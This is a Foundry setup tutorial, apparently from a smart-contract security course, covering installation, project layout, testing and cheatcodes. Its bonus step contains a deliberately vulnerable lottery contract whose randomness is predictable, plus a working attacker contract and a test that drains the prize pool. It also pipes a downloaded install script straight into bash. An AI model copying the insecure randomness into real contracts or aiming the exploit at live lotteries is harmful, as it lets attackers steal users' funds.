## 🛠️ Step 1 — Install Foundry

### 1.1 Download the `foundryup` Installer Script

```bash
curl -L https://foundry.paradigm.xyz | bash
```

What this command does:
- Downloads the `foundryup` script and installs it to `~/.foundry/bin/`
- Automatically detects your shell (zsh / bash) and adds `~/.foundry/bin` to your `$PATH`
- **Note**: At this point, only the `foundryup` manager itself has been installed — the actual binaries (`forge`, `cast`, etc.) have not been downloaded yet

### 1.2 Reload Your Shell Environment

```bash
# If you are using zsh (default on macOS)
source ~/.zshenv

# If you are using bash
source ~/.bashrc
```

> [!TIP]
> Alternatively, simply open a **new terminal window** — the environment variables will take effect automatically.

### 1.3 Run `foundryup` to Install the Toolchain

```bash
foundryup
```

You should see output similar to:

### 1.5 Understanding the Foundry Toolchain

| Tool | Purpose | Analogy |
|------|---------|---------|
| `forge` | Compile, test, and deploy Solidity contracts | Hardhat's `npx hardhat compile/test` |
| `cast` | Interact with on-chain contracts (read/write), format conversions | A CLI version of ethers.js |
| `anvil` | Spin up a local EVM node (can fork mainnet) | Hardhat Network / Ganache |
| `chisel` | Solidity REPL (interactive command-line) | Python's `ipython` |

> [!IMPORTANT]
> If `forge --version` returns `command not found`, your `$PATH` is not configured correctly.
> Manually run: `export PATH="$HOME/.foundry/bin:$PATH"` and retry.

## 📦 Step 2 — Create a Foundry Project

### 2.1 Create the Project Directory and Initialize

```bash
# Create the project folder
mkdir day01-blockchain-basics
cd day01-blockchain-basics

# Initialize a Foundry project (without creating a nested git repo)
forge init . --no-git
```

> [!NOTE]
> The `--no-git` flag prevents `forge init` from creating a new `.git` repository inside the project. This is useful when your project already lives inside an existing git repository. If you want a standalone git repo, omit `--no-git`.

Expected output:

```
Installed forge-std v1.16.0
Initialized forge project
```

### 2.2 Understand the Project Structure

Run `tree -L 2` (or `find . -maxdepth 2 -not -path './lib/*'`) to inspect the layout:

```
day01-blockchain-basics/
├── foundry.toml          # Foundry config file (analogous to hardhat.config.ts)
├── lib/                  # Dependencies (managed via git submodules)
│   └── forge-std/        # Foundry's standard test library (auto-installed)
├── script/               # Deployment scripts directory
│   └── Counter.s.sol     # Example deploy script
├── src/                  # Contract source code directory
│   └── Counter.sol       # Example contract
└── test/                 # Test files directory
    └── Counter.t.sol     # Example test
```

**Key files and directories**:

| File / Directory | Purpose | Naming Convention |
|------------------|---------|-------------------|
| `src/` | Your Solidity contract source files | `*.sol` |
| `test/` | Test files | `*.t.sol` (the `.t.` suffix is a Foundry convention for tests) |
| `script/` | Deployment scripts | `*.s.sol` (the `.s.` suffix is a Foundry convention for scripts) |
| `lib/` | External dependencies (installed via `forge install`) | git submodules |
| `foundry.toml` | Compiler version, optimization, RPC endpoints, and other settings | TOML format |

### 2.3 Inspect the `foundry.toml` Configuration

```bash
cat foundry.toml
```

Default contents:

```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]

# See more config options https://github.com/foundry-rs/foundry/blob/master/crates/config/README.md#all-options
```

### 2.4 Read the Example Contract `src/Counter.sol`

```bash
cat src/Counter.sol
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Counter {
    uint256 public number;

    function setNumber(uint256 newNumber) public {
        number = newNumber;
    }

    function increment() public {
        number++;
    }
}
```

**Code walkthrough**:
- `uint256 public number` — A public state variable. Solidity automatically generates a `number()` getter function.
- `setNumber()` — Directly sets the value of `number`.
- `increment()` — Increments `number` by 1.

### 2.5 Read the Example Test `test/Counter.t.sol`

```bash
cat test/Counter.t.sol
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Counter} from "../src/Counter.sol";

contract CounterTest is Test {
    Counter public counter;

    function setUp() public {
        counter = new Counter();
        counter.setNumber(0);
    }

    function test_Increment() public {
        counter.increment();
        assertEq(counter.number(), 1);
    }

    function testFuzz_SetNumber(uint256 x) public {
        counter.setNumber(x);
        assertEq(counter.number(), x);
    }
}
```

**Test code walkthrough**:

| Element | Explanation |
|---------|-------------|
| `import {Test} from "forge-std/Test.sol"` | Imports Foundry's test base class, which provides `assertEq`, `vm` cheatcodes, and more |
| `is Test` | Test contracts must inherit from `Test` |
| `setUp()` | Called automatically before each test case runs — used to initialize state |
| `test_Increment()` | Functions prefixed with `test` are test cases. Foundry auto-discovers and executes them |
| `testFuzz_SetNumber(uint256 x)` | A `test` function with parameters = a **fuzz test**. Foundry automatically generates random inputs |
| `assertEq(a, b)` | Asserts that `a == b`. The test fails if the assertion does not hold |

> [!TIP]
> **Fuzz testing** is one of Foundry's killer features. It automatically generates thousands of random inputs to verify your function, without you needing to manually specify each test case. By default, it runs 256 iterations.

## 🧪 Step 3 — Build and Run `forge test`

### 3.1 Compile the Contracts

```bash
forge build
```

Expected output:

```
[⠊] Compiling...
[⠢] Compiling 21 files with Solc 0.8.x
[⠆] Solc 0.8.x finished in 1.23s
Compiler run successful!
```

Compiled artifacts (ABI + bytecode) are output to the `out/` directory.

### 3.2 Run the Tests

```bash
forge test
```

Expected output:

```
[⠊] Compiling...
No files changed, compilation skipped

Ran 2 tests for test/Counter.t.sol:CounterTest
[PASS] testFuzz_SetNumber(uint256) (runs: 256, μ: 31281, ~: 31281)
[PASS] test_Increment() (gas: 28661)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.43ms (4.85ms CPU time)

Ran 1 test suite in 130.98ms (5.43ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

🎉 **Both tests pass!** You have successfully run `forge test`.

### 3.3 Increase Verbosity — Understanding the Execution in Depth

`forge test` supports verbosity levels from `-v` to `-vvvvv`:

| Flag | Output |
|------|--------|
| (none) | Shows only PASS/FAIL |
| `-v` | Same as above |
| `-vv` | Shows `console.log` and `emit` output from tests |
| `-vvv` | Shows **EVM Stack Traces** for failing tests |
| `-vvvv` | Shows full **EVM Traces** for all tests (including every CALL) |
| `-vvvvv` | Shows full traces for all tests + **Storage changes** |

Try the most verbose output:

```bash
forge test -vvvv
```

You will see a detailed trace of every `CALL`, `SSTORE`, `SLOAD` operation. This is critically important for security auditing and vulnerability analysis later in the course.

### 3.4 Run Specific Tests

```bash
# Run only tests whose name matches "Increment"
forge test --match-test test_Increment

# Run only tests within a specific contract
forge test --match-contract CounterTest

# Run tests and output a Gas consumption report
forge test --gas-report
```

## 🔬 Step 4 (Bonus) — Replace Counter with the Day 1 Vulnerable Contract

Now that you have mastered the basic workflow, challenge yourself: replace the default `Counter` with the `VulnerableLottery` from Day 1's theory session.

### 4.1 Replace `src/Counter.sol`

Delete `src/Counter.sol` and create `src/VulnerableLottery.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title VulnerableLottery
/// @notice An insecure lottery that uses block properties for randomness.
contract VulnerableLottery {
    uint256 public ticketPrice = 0.1 ether;
    address[] public players;

    event Winner(address indexed winner, uint256 amount);

    function buyTicket() external payable {
        require(msg.value == ticketPrice, "Send exactly 0.1 ETH");
        players.push(msg.sender);
    }

    function pickWinner() external {
        require(players.length >= 3, "Need at least 3 players");

        // ❌ INSECURE: All inputs are known at transaction execution time
        uint256 randomIndex = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.prevrandao,
                    block.number,
                    players.length
                )
            )
        ) % players.length;

        address winner = players[randomIndex];
        uint256 prize = address(this).balance;
        delete players;

        (bool success, ) = winner.call{value: prize}("");
        require(success, "Transfer failed");

        emit Winner(winner, prize);
    }
}
```

### 4.2 Replace `test/Counter.t.sol`

Delete `test/Counter.t.sol` and create `test/VulnerableLottery.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableLottery.sol";

/// @title LotteryAttacker — Pre-computes the "random" result
contract LotteryAttacker {
    VulnerableLottery public lottery;

    constructor(address _lottery) {
        lottery = VulnerableLottery(_lottery);
    }

    function buyTicket() external payable {
        lottery.buyTicket{value: 0.1 ether}();
    }

    function exploitPickWinner() external {
        uint256 playersLength = 3;

        // Pre-compute the winner using the exact same formula as the contract
        uint256 predictedIndex = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.prevrandao,
                    block.number,
                    playersLength
                )
            )
        ) % playersLength;

        // Only proceed if we are the predicted winner
        require(
            lottery.players(predictedIndex) == address(this),
            "Not our turn -- skip this block"
        );

        lottery.pickWinner();
    }

    receive() external payable {}
}

/// @title LotteryExploitTest — Proves the lottery can be gamed
contract LotteryExploitTest is Test {
    VulnerableLottery lottery;
    LotteryAttacker attacker;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        lottery = new VulnerableLottery();
        attacker = new LotteryAttacker(address(lottery));

        // Fund each account with ETH
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function testExploit() public {
        // Alice and Bob buy tickets normally
        vm.prank(alice);
        lottery.buyTicket{value: 0.1 ether}();

        vm.prank(bob);
        lottery.buyTicket{value: 0.1 ether}();

        // The attacker buys a ticket
        attacker.buyTicket{value: 0.1 ether}();

        // Verify the players array
        assertEq(lottery.players(0), alice);
        assertEq(lottery.players(1), bob);
        assertEq(lottery.players(2), address(attacker));

        // Set controllable block properties (Foundry cheatcodes)
        vm.warp(1700000000);                     // Set block.timestamp
        vm.prevrandao(bytes32(uint256(42)));      // Set block.prevrandao
        vm.roll(100);                            // Set block.number

        // The attacker exploits the pre-computable randomness
        attacker.exploitPickWinner();

        // Verify: the attacker received the entire prize pool
        assertGt(address(attacker).balance, 0.9 ether);
        assertEq(address(lottery).balance, 0);

        emit log_string(">>> Attacker successfully predicted the lottery winner!");
    }
}
```

### 4.3 Build and Run

```bash
# Clean up old compiled artifacts
forge clean

# Compile
forge build

# Run the exploit test with full EVM trace
forge test -vvvv --match-test testExploit
```

Expected output:

```
[PASS] testExploit() (gas: ...)
Logs:
  >>> Attacker successfully predicted the lottery winner!
```

> [!IMPORTANT]
> This test proves a core security principle: **all on-chain data is public**. `block.timestamp`, `block.prevrandao`, and `block.number` are visible to every contract within the same block. An attacker can use the exact same formula to predict the "random" outcome.

## 🧰 Foundry Cheatcodes Quick Reference

You will frequently use `vm.*` cheatcodes in your tests. Here are the ones used in this Lab:

| Cheatcode | Purpose | Example |
|-----------|---------|---------|
| `vm.deal(addr, amt)` | Set the ETH balance for an address | `vm.deal(alice, 1 ether)` |
| `vm.prank(addr)` | Set `msg.sender` to `addr` for the next call | `vm.prank(alice)` |
| `vm.warp(ts)` | Set `block.timestamp` | `vm.warp(1700000000)` |
| `vm.roll(num)` | Set `block.number` | `vm.roll(100)` |
| `vm.prevrandao(val)` | Set `block.prevrandao` | `vm.prevrandao(bytes32(uint256(42)))` |
| `makeAddr(name)` | Generate a deterministic address from a label | `makeAddr("alice")` |
| `assertEq(a, b)` | Assert equality | `assertEq(counter.number(), 1)` |
| `assertGt(a, b)` | Assert `a > b` | `assertGt(balance, 0.9 ether)` |

Full cheatcodes reference: [Foundry Book — Cheatcodes Reference](https://book.getfoundry.sh/cheatcodes/)

## 🗒️ CLI Command Quick Reference

```bash
# === Installation & Updates ===
curl -L https://foundry.paradigm.xyz | bash      # Install foundryup
foundryup                                         # Install/update the toolchain
foundryup --version stable                        # Install the stable release

# === Project Management ===
forge init my-project                             # Create a new project
forge init . --no-git                             # Initialize in current dir (no git)
forge install OpenZeppelin/openzeppelin-contracts  # Install a dependency
forge remappings                                  # View import path remappings
forge clean                                       # Clean compiled artifacts

# === Build & Test ===
forge build                                       # Compile contracts
forge test                                        # Run all tests
forge test -vvvv                                  # Run with full EVM traces
forge test --match-test testExploit               # Run a specific test
forge test --match-contract CounterTest           # Run tests in a specific contract
forge test --gas-report                           # Output gas consumption report
forge test --fork-url https://eth.llamarpc.com    # Fork mainnet and run tests

# === Local Node ===
anvil                                             # Start local EVM node (port 8545)
anvil --fork-url https://eth.llamarpc.com         # Fork mainnet locally
anvil --block-time 12                             # 12-second block intervals

# === On-chain Interaction ===
cast block-number --rpc-url https://eth.llamarpc.com   # Get latest block number
cast balance <address> --ether --rpc-url <rpc>         # Query ETH balance
cast call <contract> "func()" --rpc-url <rpc>          # Read-only call

# === Solidity REPL ===
chisel                                            # Launch interactive Solidity env
```
